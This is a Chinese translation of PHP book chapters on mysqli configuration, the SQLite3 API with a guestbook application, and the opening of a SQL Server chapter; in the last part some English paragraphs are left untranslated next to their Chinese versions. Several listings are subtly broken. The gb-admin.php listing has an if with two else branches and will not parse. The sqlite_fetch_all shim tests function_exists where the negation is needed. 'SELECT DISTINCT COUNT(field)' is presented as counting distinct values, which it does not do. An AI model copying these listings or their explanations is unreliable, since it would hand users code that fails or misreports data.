在 php.ini 配置文件（[MySQLi] 部分）中，mysqli 扩展设置了表 19.2 中所示的参数等。





| 参数 | 描述 | 默认值 |
|---|---|---|
| mysqli.default_host | 标准服务器 | ZERO |
| mysqli.default_port | 标准端口 | 3306 |
| mysqli.default_pw | 默认密码 | ZERO |
| mysqli.default_socket | 默认套接字名称 | ZERO |
| mysqli.default_user | 默认用户名 | ZERO |
| mysqli.max_links | 最大连接数 | "-1" (无限制) |
| mysqli.max_persistent | 持久连接最大数 | "-1" (无限制) |

表 19.2 "php.ini" 中的一些配置参数

如果将 mysqlnd 用作客户端库（这是默认设置），则可以在 [mysqlnd] 节中进行进一步设置，包括表 19.3 中的内容。

| 参数 | 描述 | 默认值 |
|---|---|---|
| mysqlnd.collect_memory_statistics | 决定是否收集内存消耗的统计信息 | 0 |
| mysqli.collect_statistics | 决定是否收集一般统计信息 | 1 |
| mysqlnd.net_cmd_buffer_size | 向 MySQL 发送命令时的缓冲区大小（字节） | 4096 |
| mysqlnd.net_read_buffer_size | 从 MySQL 读取返回时的缓冲区大小（字节） | 32768 |

表 19.3 "php.ini" 中的一些 "mysqlnd" 配置参数

# 第 20 章

# SQLite

> 如果文件型数据库足够满足需求，那么 SQLite 是一个出乎意料的高性能选择——尤其是在读取数据时（写入时则不然，这一点显而易见）。

让我们先从历史回顾开始：PHP 5 最引人注目的新特性之一是对 SQLite 数据库的支持。当 PHP 5 将提供这一新功能成为公开知识时，首先传出了 MySQL 已死或将被 PHP 抛弃的声音。¹ 当然，事实并非如此。

长话短说：SQLite 并非 MySQL 的替代品，而是在某些情况下的一种替代方案。众所周知，PHP 支持大量数据库；数量之多，甚至无法在本书中一一介绍。SQLite 是其中之一，但它在社区中引起了相当大的轰动。

SQLite 实际上是一个 C 库，可在 www.sqlite.org 获取，现已集成到 PHP 中。SQLite 的最大优势在于它是一种基于文件的数据库。因此，无需在后台运行守护进程；您只需使用文件系统即可。这简化了应用程序的处理和部署。

SQLite 的最大优势也是其最大劣势：从文件读取时，系统性能非常出色，通常甚至比 MySQL 或 Microsoft SQL Server 等成熟数据库² 更快。然而，在写入时，整个数据库文件——即完整的数据库——会被锁定，这当然比其竞争对手慢得多。例如，对于读操作众多且写操作极少的新闻门户，SQLite 是一个绝佳选择。如果对高访问量网站的用户行为进行分析并存储在数据库中（跟踪），那么可能比 SQLite 有更好的替代方案。

## 20.1 准备工作

SQLite 的安装很简单。该库已集成到 PHP 中，调用 phpinfo() 会显示关于该库的信息（参见图 20.1）。如果想要移除它，需要使用 --without-sqlite3 选项编译 PHP。

从命令行按钮的名称已经可以看出，它使用的是 SQLite 3 版本——简称 SQLite3。更精确地说：自 PHP 5.3 起即支持该版本的数据库。这对 Windows 用户有影响。他们必须在 php.ini 中加载 php_sqlite3.dll 扩展：

```
extension=sqlite3
```

php_sqlite.dll DLL 之前曾被使用，但当前 PHP 版本的官方分发版中已不再提供。

无需更多操作。无需启动服务器进程；您只需要对要使用的数据库文件具有读写权限。您还需要对文件所在目录拥有这些权限，因为 SQLite 也可能创建临时文件。

### 注意

如果在数据库中存储敏感数据，应遵循三条指导原则：

- 1. 如果可能，将数据库文件放在用户无法通过 HTTP 访问、但仅可通过 PHP 脚本访问的目录中。这可防止下载。或者，可以配置 Web 服务器，使特定扩展名（例如 .db）的文件无法下载。
- 2. 如果做不到，至少要为数据库想一个富有想象力的名称——例如 xlbrmf.db。database.db、file.db 或 creditcarddetails.db 这类文件会很快被擅长猜测名称的数据窃贼找到。但是，我们恳请您：也遵循第一点中的某条建议。
- 3. 拦截 PHP 错误消息。这些消息也可能包含数据库文件的名称。

## 20.2 使用 SQLite 访问数据库

对于 SQLite，将逐一介绍必要的步骤：建立连接、发送查询和分析返回值。事务等特殊功能也不会被忽略。

先说好消息（同时也是坏消息）：在内部，SQLite 数据库中的所有数据都作为字符串处理。因此，SQLite 多少会自动执行类型转换。不过，这使得处理变得稍微容易一些。

> **注意：是使用函数还是方法？**
> 
> 在 PHP 中，对大多数数据库类型有两种访问方式。要么像 PHP 4 中那样使用函数，并将数据库句柄作为第一个参数传递（在建立连接时获得），要么使用 OOP 语法。
> 
> SQLite 也是如此——直到 PHP 5.2 为止。自 5.3 版本及上述改为 SQLite3 以来，只有基于 OOP 的编程接口可用。

### 20.2.1 连接设置

建立与 SQLite 数据库的连接相对简单。不需要任何复杂的连接参数，只需一个文件名：即数据库文件的名称。

作为第二个参数，可以（可选）指定打开数据库的模式。可能有三个值（可以按位运算符组合）：

- SQLITE3_OPEN_READONLY
  以只读方式打开

- SQLITE3_OPEN_READWRITE
  以读写方式打开（默认行为）

- SQLITE3_OPEN_CREATE
  如果数据库文件不存在则创建（也是标准行为）

第三个参数包含用于数据库的可选加密键。必须将所有这些内容传递给其构造函数的对象称为 SQLite3()。使用实例的 close() 方法再次关闭连接。

```
<?php
try {
    $db = new SQLite3("file.db");
    echo "Connection successful.";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

Listing 20.1 使用 SQLite 建立连接 ("sqlite-connect.php")

> **提示**
> 
> 可以不指定文件名，而改用 `:memory:`，在这种情况下数据库会在内存中创建。不幸的是，脚本结束后它就会消失。这通常仅对临时表（用于保存中间结果）或测试目的有用。

### 20.2.2 查询

向 SQLite 数据库发送查询有两种方法：

- exec() 用于无返回值的查询
- query() 用于有返回值的查询

如果喜欢简单方便，可以使用 `query()`，因为它也适用于不返回值的查询（此时函数返回值不包含相关数据）。但是，对于不返回值的查询（例如 `CREATE TABLE` 或 `INSERT`），最好使用 `exec()`。Listing 20.2 中也是如此：只需将 SQL 命令作为参数传递即可。

下面的代码清单创建一个测试表（上一章中熟悉的那个表），并向其中插入一些数据。

```
<?php
try {
    $db = new SQLite3("file.db");
    $sql = "CREATE TABLE my_table (
    id INTEGER PRIMARY KEY,
    field VARCHAR(1000)
    )";
    if ($db->exec($sql)) {
    echo "Table created.<br />";
    } else {
    echo "Error!";
    }
    $sql = "INSERT INTO my_table (field) VALUES ('Value1')";
    if ($db->exec($sql)) {
    echo "Data entered.<br />";
    } else {
```





```php
echo "Error!";
}
$sql = "INSERT INTO my_table (field) VALUES ('value2')";
if ($db->exec($sql)) {
echo "Data entered.";
} else {
echo "Error!";
}
$db->close();
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage();
}
?>
```

## 清单 20.2 无返回值的查询 ("sqlite-query.php")

**提示**
可以在 SQLite 中使用 INTEGER PRIMARY KEY 数据类型来创建自增值。这是一个数值字段，数据库中每添加一条新记录，其值就会自动加 1，无需任何操作。

**注意：错误处理**
SQLite 下的错误处理如下。lastErrorCode() 方法返回相应实例的最后一个错误代码。通过 lastErrorMsg()，可以将代码转换为“可读”的错误消息。遗憾的是，无法删除错误代码，这在连续查询中可能会成为问题。

同样，请记住，来自用户的数据在用于 SQL 命令之前应始终经过检查和转换。SQLite 模块提供 escapeString() 方法，可将字符串中“危险”的特殊字符（如撇号）转换为 SQL 中技术上无害的内容：

```php
$value = $_POST["value"] ?? "";
$value = $db->escapeString($value);
$sql = "INSERT INTO my_table (field) VALUES ('$value')";
```

例如，“Rasmus' invention”会变成字符串“Rasmus'' invention”，这在 SQL 语句中不会带来任何潜在危险。

或者，SQLite 中也有参数化查询，因此您不必手动担心特殊的 SQL 字符。这种方法的核心是将命令和数据相互分隔。出于这个原因，需要三个步骤：

1. 使用 `prepare()` 方法创建 `SQLite3Stmt` 类型的对象。作为参数，传递一个 SQL 语句，在其中使用以冒号开头的占位符。

2. `SQLite3Stmt` 对象提供 `bindValue()` 方法，用于将数据绑定到占位符。

3. `execute()` 方法执行用相应值填充的查询。

清单 20.3 本质上与清单 20.2 完成相同的操作，但使用了 *预处理语句*（第一个查询除外）。

```php
<?php
try {
    $db = new SQLite3("file.db");
    $sql = "CREATE TABLE my_table (
    id INTEGER PRIMARY KEY,
    field VARCHAR(1000)
    )";
    if ($db->exec($sql)) {
        echo "Table created.<br />";
    } else {
        echo "Error!";
    }
    $sql = "INSERT INTO my_table (field) VALUES (:value)";
    if ($stmt = $db->prepare($sql)) {
        $stmt->bindValue(":value", "value1");
        $stmt->execute();
    } else {
        echo "Error!";
    }
    $sql = "INSERT INTO my_table (field) VALUES (:value)";
    if ($stmt = $db->prepare($sql)) {
        $stmt->bindValue(":value", "value2");
        $stmt->execute();
    } else {
        echo "Error!";
    }
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

## 清单 20.3 无返回值但带预处理语句的查询（“sqlite-query-prepared.php”)

**注意：另行绑定值**

或者，您也可以使用 bindParam() 方法将值绑定到 SQL 查询。但是，不能向此方法分配标量值，如清单 20.3 所示。相反，您需要一个可以按引用使用的变量：

```php
$sql = "INSERT INTO my_table (field) VALUES (:value)";
$stmt = $db->prepare($sql);
$w = "value3"; $stmt->bindParam(":value", $w);
$stmt->execute();
```

### 20.2.3 返回值

如前所述，当查询的返回值相关时，使用 query()。使用 query() 的返回值（类型为 SQLite3Result），可以访问结果列表中的各个值。可以使用关联数组或索引数组访问这些值，两者均由 fetchArray() 方法处理。作为参数传递以下三个常数之一：

- **SQLITE3_ASSOC**
  关联数组（列名为键）
- **SQLITE3_NUM**
  索引数组（列号为键）
- **SQLITE3_BOTH**
  两种类型的数组（默认行为）

以下示例显示关联访问；输出如图 20.2 所示。

```php
<?php
try {
    $db = new SQLite3("file.db");
    $sql = "SELECT * FROM my_table";
    $result = $db->query($sql);
    echo "<ul>";
    while ($row = $result->fetchArray()) {
        echo "<li>" . htmlspecialchars($row["id"]) .
             ": " . htmlspecialchars($row["field"]) . "</li>";
    }
    echo "</ul>";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

## 清单 20.4 以关联数组形式读取数据（“sqlite-read-associative.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_604_0.png)

## 图 20.2 微型数据库中的所有条目

现代 PHP 版本的爱好者（希望所有人都是！）可能会反驳说，这固然不错，但 PHP 提供了迭代器的概念。如果 PHP 的 SQLite 库开发人员集成了迭代器，该多好啊！庆幸的是！开发人员确实考虑到了这一点，因此您可以使用 `foreach()` 遍历结果列表，如下一个清单所示。

```php
<?php
try {
    $db = new SQLite3("file.db");
    $sql = "SELECT * FROM my_table";
    $result = $db->query($sql);
    echo "<ul>";
    foreach ($result as $row) {
        echo "<li>" . htmlspecialchars($row["id"]) .
             ": " . htmlspecialchars($row["field"]) . "</li>" ;
    }
    echo "</ul>";
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

## 清单 20.5 通过迭代器读取数据（“sqlite-read-iterator.php”)

最后，我们要指出一种特殊的查询变体，它可以带来额外的性能提升。我们指的是只有一个返回值（或者您只关心结果中第一列的值）的 SELECT 查询。

PHP 为此提供了一个特殊方法：querySingle() 向数据库发送查询，并返回第一列的值，或者（作为数组）返回完整的第一行。

如果在示例表上使用 "SELECT * FROM my_table" 执行 querySingle()，您将收到第一列（即 id 列）的值。如果您只关心结果列表的第一条数据记录，并希望完整获取它，则必须将 true 作为第二个参数传递。

在这两种情况下，都不再需要调用 fetchArray()，您可以立即获得结果。
以下清单显示了一个示例。

```php
<?php
try {
    $db = new SQLite3("file.db");
    $sql = "SELECT field FROM my_table";
    $result = $db->querySingle($sql, true);
    echo "<ul>";
    foreach ($result as $element) {
        echo "<li>" . htmlspecialchars($element) . "</li>";
    }
    echo "</ul>";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

## 清单 20.6 读取单列（“sqlite-read-single-query.php”)

如果使用 SQL 的聚合函数（如 COUNT(*)），querySingle() 方法特别方便。这样可以立即获得结果，而无需先操作数组。

```php
<?php
try {
    $db = new SQLite3("file.db");
    $sql = "SELECT DISTINCT COUNT(field) FROM my_table";
    $result = $db->querySingle($sql);
    echo "There are $result different elements in the database.";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

## 清单 20.7 使用聚合函数（“sqlite-read-count.php”)

> **注意：在 SQLite 中计数**
> 
> 了解上一次查询影响了多少行通常很有趣（UPDATE 的变更行数，DELETE 的删除行数）。可以使用 changes() 方法完成此操作。但是，您仍可以使用 exec() 将 UPDATE 和 DELETE 查询发送到数据库，因为 changes() 是实例的方法：
> 
> $db->changes()

### 20.2.4 特殊功能

虽然 SQLite 是一个相当小的数据库——C 库包含 200,000 行代码（包括注释），这并不算多——但它确实提供了一些有用的附加功能，下面将简要介绍其中几个。

### 确定最后一个自增值

SQLite 的 INTEGER PRIMARY KEY 数据类型是一种自增值。这意味着，如果将带有此值的元素插入到表中，它会自动获得一个新 ID。但是，通常很难确定此 ID——难到一些抽象库甚至不提供此功能。

有几种可能的解决方案，但它们都有各自的陷阱：

- 插入新值后立即执行一个按 ID 降序排列的 SELECT 语句。最后添加的元素拥有最高 ID。不幸的是，如果另一个脚本在您的 INSERT 语句之后立即执行 INSERT 语句，此方法就不适用了：您将收到“其他”ID。

- 创建一个事务，先执行 INSERT 语句，再执行 SELECT 语句。如果数据库确实始终递增 ID，此方法有效。但是，已释放的 ID（由于删除数据记录）可能会在以后再次被使用——即使主键实际上应该是永久唯一的。

- 向数据库插入一个值并使用 SELECT 搜索它。只要所有值都是唯一的，此方法即可行（这相当不现实）。

- 向数据库插入一个值，并在另一个数据库字段中保存一个唯一值（例如，时间戳加上几个随机字符）。然后使用 SELECT 搜索该值。

这有时相当复杂，但可以简单得多。lastInsertRowID() 方法返回数据库句柄中最后插入值的 ID（见图 20.3）——前提是表中确实有自增值字段。

```php
<?php
try {
    $db = new SQLite3("file.db");
    $sql = "INSERT INTO my_table (field) VALUES ('value3')";
    if ($db->exec($sql)) {
        $id = $db->lastInsertRowID();
        echo "Data with ID $id entered.";
    } else {
        echo "Error!";
    }
    $db->close();
}
```





```php
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage();
}
?>
```

### 列表 20.8 最后输入数据集的 ID ("sqlite-rowid.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_607_0.png)

### 图 20.3 新数据库条目的 ID 为 3

### 嵌入 PHP 代码

由于 SQLite 嵌入在 PHP 中，人们很快就产生了想要让两种技术之间建立更紧密联系的想法。为此构思了两条路径，但只保留了一条。

早期的 PHP 版本丰富了嵌入式 SQLite，以便在每条 SQL 命令中都可以使用 `php()` 函数。第一个参数是 PHP 函数的名称（用单引号括起来），第二个参数是列名（不加单引号）：

```sql
SELECT php('strtoupper', field) FROM table
```

读取的工作方式与往常几乎相同。结果列表的列名已调整。在示例中，该列不再称为 `field`，而是 `php('strtoupper', field)`。因此，查询的单个值是通过数字索引访问的。由于我们只查询一个字段，`querySingle()` 也能胜任。其形式如下：

```php
<?php
try {
    $db = new SQLite3("file.db");
    $sql = "SELECT php('strtoupper', field) FROM my_table";
    $result = $db->querySingle($sql);
    echo "<ul>";
    foreach ($result as $element) {
        echo "<li>" . htmlspecialchars($element) . "</li>";
    }
    echo "</ul>";
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
```

当前的 PHP/SQLite 版本不再支持此功能，这就是为什么前面的列表没有带文件名的签名。不过，第二种变体今天仍然有效。这包括自己编写 PHP 函数，然后在 SQLite 中使用它。分几个步骤完成：

- 1. 首先，创建自己的辅助函数。这里可以看到一个构造的示例，它先将文本转换为大写，然后对其进行 HTML 编码，并添加粗体和斜体的格式说明：

```php
function sqlite_textart($s) {
return "<b><i>" .
htmlspecialchars(strtoupper($s)) .
"</i></b>";
}
```

- 2. 通过调用 createFunction() 将此函数注册到 SQLite。参数是 SQL 中的函数名和您自己的函数名（或匿名函数）：

```php
$db->createFunction("texteffect", "sqlite_textart");
```

- 3. 在 SQL 命令中使用新名称的新函数：

```sql
$sql = "SELECT texteffect(field) FROM table";
```

列表 20.9 显示了一个完整示例；输出见图 20.4。

```php
<?php
function sqlite_textart($s) {
return "<b><i>" .
htmlspecialchars(strtoupper($s)) .
"</i></b>";
}
try {
$db = new SQLite3("file.db");
$db->createFunction("texteffect", "sqlite_textart");
$sql = "SELECT id, texteffect(field) FROM my_table";
$result = $db->query($sql);
echo "<ul>";
while ($row = $result->fetchArray()) {
echo "<li>" . $row[0] . ": " . $row[1] . "</li>";
}
echo "</ul>";
$db->close();
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage();
}
?>
```

### 列表 20.9 SQLite 中的自定义函数 ("sqlite-read-php.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_609_0.png)

### 图 20.4 数据库中的值已转换

> **提示**
> 此过程会更改列名（在示例中，从 `field` 更改为 `texteffect (field)`），这就是为什么在列表 20.9 中通过数字索引访问字段值。

### 20.2.5 旧代码迁移

前面的解释介绍了需要 SQLite 3 或更高版本的 API。然而，在实践中，仍有基于旧版 SQLite 的代码可用。在某些情况下，甚至有人尝试为较新的 PHP 版本编译旧的 SQLite 扩展，以保持应用程序可执行。当然，唯一合理的方法是迁移到新 API。

作为快速的临时解决方案，作者在 GitHub 上发布了一个小型辅助库（[sqlite-shim GitHub 仓库](https://github.com/wenz/sqlite-shim)）：`sqlite-shim`（见图 20.5）。这个辅助库实现了许多“旧”的 SQLite2 函数，并在后台执行相应的 SQLite3 方法。

这里可以看到库中的典型摘录：

```php
if (!function_exists('sqlite_open')) {
function sqlite_open($filename, $mode = 0666)
{
$handle = new \SQLite3($filename);
return $handle;
}
}
```

因此，如果 sqlite_open() 函数不存在（如果提供了旧的 SQLite 扩展，则该函数会存在），它会被定义，但在后台使用 SQLite3 类。

![](img/ae7820c36e8f24c1623d26668b28e80e_610_0.png)

### 图 20.5 sqlite-shim 的 GitHub 页面

移植 sqlite_fetch_all() 函数（它确定查询结果的所有数据记录）稍微麻烦一些；SQLite3 中没有此类功能。因此，我们必须手动实现：

```php
if (function_exists('sqlite_fetch_all')) {
    function sqlite_fetch_all($result, $mode = SQLITE_BOTH)
    {
        $rows = array();
        while ($row = $result->fetchArray($mode)) {
            array_push($rows, $row);
        }
        return $rows;
    }
}
```

SQLITE_BOTH 常数自然只存在于旧的 SQLite 扩展中，因此我们必须单独定义它（以及其他常数）：

```php
if (!defined('SQLITE_BOTH')) {
    define('SQLITE_BOTH', SQLITE3_BOTH);
}
```

sqlite-shim 还以同样的方式实现了其他 SQLite 功能。如果您需要移植旧代码，这个库希望能让您的工作更轻松。

## 20.3 应用示例

经过所有理论之后，让我们重新回顾前面章节中流行的实用应用：留言簿。各个文件已直接针对 SQLite 进行了调整，以便您拥有专门针对该数据库的应用程序。

### 20.3.1 创建表

要创建表，可以使用第 20.2.1 节和第 20.2.2 节中的列表作为蓝图。主要函数是 SQLite3 构造函数和 exec()。

```php
<?php
try {
	$db = new SQLite3("guestbook.db");
	$sql = "CREATE TABLE guestbook (
		id INTEGER PRIMARY KEY,
		heading VARCHAR(1000),
		entry VARCHAR(5000),
		author VARCHAR(50),
		email VARCHAR(100),
		date TIMESTAMP
	)";
	if ($db->exec($sql)) {
		echo "Table created.<br />";
	} else {
		echo "Error!";
	}
} catch (Exception $ex) {
	echo "Error: " . $ex->getMessage();
}
?>
```

### 列表 20.10 表已创建 ("gb-create.php")

### 20.3.2 输入数据

将留言簿条目插入数据库时，应特别注意：所有写入数据库的值都必须先使用 escapeString() 进行预处理，以使危险的特殊字符失效。或者，您也可以使用预处理语句。

其余部分相对简单：组装一个 INSERT 语句，调用 exec()，就完成了。作为特别福利，新条目的管理表单已链接。当然，这在生产系统中不合适，但这里展示了 lastInsertRowID() 的用法。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_POST["Name"]) &&
isset($_POST["Email"]) &&
isset($_POST["Heading"]) &&
isset($_POST["Comment"])) {
try {
$db = new SQLite3("guestbook.db");
$sql = vsprintf("INSERT INTO guestbook
(heading,
entry,
author,
email,
date)
VALUES ('%s', '%s', '%s', '%s', '%s')",
[
$db->escapeString($_POST["Heading"]),
$db->escapeString($_POST["Comment"]),
$db->escapeString($_POST["Name"]),
$db->escapeString($_POST["Email"]),
time()
]);
if ($db->exec($sql)) {
$id = $db->lastInsertRowID();
echo "Entry added. <a href=\"gb-edit.php?id=$id\">Edit</a>";
} else {
echo "Error!";
}
} catch (Exception $ex) {
echo "Error: " . $ex->getMessage();
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" /><br />
Email address <input type="text" name="Email" /><br />
Heading <input type="text" name="Heading" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"></textarea><br />
<input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html>
```

### 列表 20.11 可以输入数据 ("gb-enter.php")

### 20.3.3 输出数据

要输出数据，会调用 SELECT * FROM guestbook ORDER BY date DESC 以先获取最新条目（见图 20.6）。

![](img/ae7820c36e8f24c1623d26668b28e80e_613_0.png)

### 图 20.6 留言簿正在填充

在以下列表中，我们使用 fetchArray() 进行逐行读取。

```html
<html>
<head>
<title>Guestbook</title>
</head>
<body>
```





```
<h1>Guestbook</h1>
<?php
try {
    $db = new SQLite3("guestbook.db");
    $sql = "SELECT * FROM guestbook ORDER BY date DESC";
    $result = $db->query($sql);
    while ($row = $result->fetchArray()) {
        printf("<p><a href=\"mailto:%s\">%s</a> wrote on at %s:</p>
        <h3>%s</h3><p>%s</p><hr noshade=\"noshade\" />",
        urlencode($row["email"]),
        htmlspecialchars($row["author"]),
        htmlspecialchars(date("Y-m-d, H:i", intval($row["date"]))),
        htmlspecialchars($row["heading"]),
        nl2br(htmlspecialchars($row["entry"]))
        );
    }
    $db->close();
} catch (Exception $ex) {
    echo "Error: " . $ex->getMessage();
}
?>
</body>
</html>
```

## 清单 20.12 输出留言簿数据 ("gb-show.php")

### 20.3.4 删除数据

要删除，第一次单击会调整链接（从 gb-admin.php?id=<ID> 到 gb-admin.php?id=<ID>&ok=1），第二次会向数据库发送 DELETE 命令。同样，为保险起见，使用 SQLite escapeString() 方法预处理要删除的条目的 ID 也很重要。

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_GET["id"]) && is_numeric($_GET["id"])) {
    if (isset($_GET["ok"])) {
        try {
            $db = new SQLite3("guestbook.db");
            $id = $db->escapeString($_GET["id"]);
            $sql = "DELETE FROM guestbook WHERE id='$id'";
            if ($db->exec($sql)) {
                echo "<p>Entry deleted.</p>
                <p><a href=\"gb-admin.php\">Back to overview
                </a></p>";
            } else {
                echo "Error!";
            }
            $db->close();
        } catch (Exception $ex) {
            echo "Error: " . $ex->getMessage();
        }
    } else {
        printf("<a href=\"gb-admin.php?id=%s&ok=1\">Really delete?
        </a>", urlencode($_GET["id"]));
    } else {
        try {
            $db = new SQLite3("guestbook.db");
            $sql = "SELECT * FROM guestbook ORDER BY date DESC";
            $result = $db->query($sql);
            while ($row = $result->fetchArray()) {
                printf("<p><b><a href=\"gb-admin.php?id=%s\">Delete this entry </a>
                - <a href=\"gb-edit.php?id=%s\">Edit this entry</a></b></p>
                <p><a href=\"mailto:%s\">%s</a> wrote on/ at %s:</p>
                <h3>%s</h3><p>%s</p><hr noshade=\"noshade\" />",
                urlencode($row["id"]),
                urlencode($row["id"]),
                htmlspecialchars($row["email"]),
                htmlspecialchars($row["author"]),
                htmlspecialchars(date("Y-m-d, H:i", intval($row["date"]))),
                htmlspecialchars($row["heading"]),
                nl2br(htmlspecialchars($row["entry"]))
                );
            }
            $db->close();
        } catch (Exception $ex) {
            echo "Error: " . $ex->getMessage();
        }
    }
?>
</body>
</html>
```

## 清单 20.13 显示包含删除选项的所有数据 ("gb-admin.php")

### 20.3.5 编辑数据

“至高无上的技艺”始终是管理条目的编辑。使用 URL 中的 ID，从数据库读取数据并用它预填表单字段。提交表单时，会从这些数据生成 UPDATE SQL 语句。

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
$Name = "";
$Email = "";
$Heading = "";
$Comment = "";
if (isset($_GET["id"]) &&
is_numeric($_GET["id"])) {
    try {
        $db = new SQLite3("guestbook.db");
        if (isset($_POST["Name"]) &&
        isset($_POST["Email"]) &&
        isset($_POST["Heading"]) &&
        isset($_POST["Comment"])) {
            $sql = vsprintf(
            "UPDATE guestbook SET
            heading = '%s',
            entry = '%s',
            author = '%s',
            email = '%s'
            WHERE id='%s'",
            [
                $db->escapeString($_POST["Heading"]),
                $db->escapeString($_POST["Comment"]),
                $db->escapeString($_POST["Name"]),
                $db->escapeString($_POST["Email"]),
                $db->escapeString($_GET["id"])
            ]
            );
            if ($db->exec($sql)) {
                echo "<p>Entry changed.</p>
                <p><a href=\"gb-admin.php\">Back to overview</a></p>";
            } else {
                echo "Error!";
            }
        }

        $sql = sprintf("SELECT * FROM guestbook WHERE id='%s'",
            $db->escapeString($_GET["id"]));
        $result = $db->query($sql);
        if ($row = $result->fetchArray()) {
            $Name = $row["author"];
            $Email = $row["email"];
            $Heading = $row["heading"];
            $Comment = $row["entry"];
        }

        $db->close();
    } catch (Exception $ex) {
        echo "Error: " . $ex->getMessage();
    }
}
?>

<form method="post" action="">
Name <input type="text" name="Name" value="<?php
echo htmlspecialchars($Name);
?>" /><br />
Email address <input type="text" name="Email" value="<?php
echo htmlspecialchars($Email);
?>" /><br />
Heading <input type="text" name="Heading" value="<?php
echo htmlspecialchars($Heading);
?>" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"><?php
echo htmlspecialchars($Comment);
?></textarea><br />
<input type="submit" name="Submit" value="Update" />
</form>
</body>
</html>
```

## 清单 20.14 编辑留言簿条目 ("gb-edit.php")

留言簿现已完成。你现在真正需要的是为管理页面添加保护机制，然后就可以进行收尾工作（尤其是布局）。

# 第 21 章 Microsoft SQL Server

Microsoft 长期以来一直致力于开源——最近，相关努力进一步加强。Microsoft 的数据库管理系统 SQL Server 尚未开源（但也许未来某一天会开源！）。尽管如此，你仍可以使用 PHP 访问它。

各个数据库厂商之间的竞争正酣。Microsoft 长期落后，甚至没有自己的产品。但随后出现了一种在许多其他地方已屡获成功的模式。首先，收购了竞争产品——在此案例中，由 Sybase 收购。中期目标是获得市场影响力。然后，雷德蒙德公司聘请了业界一些最聪明的头脑，重建并扩展了现有产品。Microsoft SQL Server (MSSQL) 现在已成为一款体面的产品，并在顶尖行列中竞争。

过去，甚至可以从 Linux 访问 MSSQL 安装。但是，当前版本的 Microsoft SQL Server 不再支持这种方法，因此我们不在此描述它。如果你有这样一个异构网络，Apache 运行在 Linux 上，而 SQL Server（必然）运行在 Windows 上，那么你将不得不寻找变通方法，例如在 Windows 平台上为数据库实现一种 API，然后通过 PHP（以及 HTTP 等）访问它。或者，更好的做是——直接在 Linux 下使用 SQL Server！¹

1 有关更多信息，请访问 http://s-prs.co/v60224。

在 Windows 下，当然可以以任一方式访问 Microsoft SQL Server。但是，取决于 SQL Server 的版本，控制方面存在一些详细的变化。

## 21.1 准备工作

Microsoft SQL Server Developer Edition 是一个免费版本，不得用于生产系统，但用于开发和测试不受限制。或者，你也可以使用另一个免费版本 Microsoft SQL Server Express Edition。这是一个已发布用于生产使用但功能有所精简的 MSSQL 版本。例如，缺少所有图形管理工具（除非你知道在哪里可以找到替代品，将在后面讨论），并且同时连接数受到限制，最大数据库大小也受到限制。尽管如此，SQL Server Express Edition 单用于测试（并且免费）是一款非常有趣的产品，也是中小型网站的潜在替代方案。你当前可以下载 2022 版本，网址为 http://s-prs.co/v602225。

顺便提一下，SQL Server 图形管理工具（Management Studio；参见图 21.1）过去也提供一个精简版免费版本，与 SQL Server Express Edition 配合使用非常完美：SQL Server Management Studio Express。该产品名称太长，因此常被缩写为记忆度也差不多的 SSMSE。但是，名称中不带 Express 的“大”管理工具现在也免费提供。因此缩写为 SSMS。你可以从提到的下载页面下载 SSMS 作为独立工具。不过，以下说明也适用于 SQL Server 的旧版本；我们使用 2012 到 2022 版本进行了测试。

![](img/ae7820c36e8f24c1623d26668b28e80e_620_0.png)

图 21.1 SQL Server 管理工作室

安装数据库服务器后，PHP 的桥接已建立。如果你系统上有旧版 PHP 并查看 php.ini，会看到以下诱人条目：

```
extension=php_mssql.dll
```

然而，这是用于控制数据库的旧版 PHP 扩展，不再维护（当前 MSSQL 版本也不再支持它）。我们无法在此继续。我们必须寻求帮助——来自 Microsoft 本身。





## 21.2 Microsoft SQL Server Driver for PHP

Microsoft has been active at PHP conferences for many years, promoting web servers (IIS), databases (SQL Server), and cloud technology (Azure) from Redmond, among other things. The company's position is of course somewhat delicate, as it also produces ASP.NET, one of PHP's main competitors.

微软多年来一直活跃于 PHP 会议，推广来自雷德蒙德的 Web 服务器（IIS）、数据库（SQL Server）和云技术（Azure）等。该公司的立场当然有些微妙，因为它也生产 ASP.NET，这是 PHP 的主要竞争对手之一。

However, many of Microsoft's contributions to PHP development are very well received by the community. These include the significantly improved Windows builds. Microsoft SQL Server Driver for PHP is not part of the PHP core itself but is nevertheless an exciting extension. This is Microsoft's own PHP extension for working with its own SQL Server. Sensationally, this extension runs not only on Windows, but also on macOS and Linux! The source code for the extension has also been available on GitHub at https://github.com/Microsoft/msphpsql for some time now.

然而，微软对 PHP 开发的许多贡献深受社区欢迎。这些包括显著改进的 Windows 构建版本。Microsoft SQL Server Driver for PHP 并非 PHP 核心本身的一部分，但仍然是一个令人兴奋的扩展。这是微软用于与其自身 SQL Server 交互的自有 PHP 扩展。令人惊叹的是，此扩展不仅在 Windows 上运行，还在 macOS 和 Linux 上运行！该扩展的源代码也已在 https://github.com/Microsoft/msphpsql 的 GitHub 上提供一段时间了。

In this section, we will briefly show you how the current version 5.12.0 of the driver works. This supports PHP versions from 8.1 to 8.3. You can find these and older (and possibly newer!) versions of the extension for download at https://github.com/Microsoft/msphpsql/releases, somewhat hidden under Assets (see Figure 21.2).

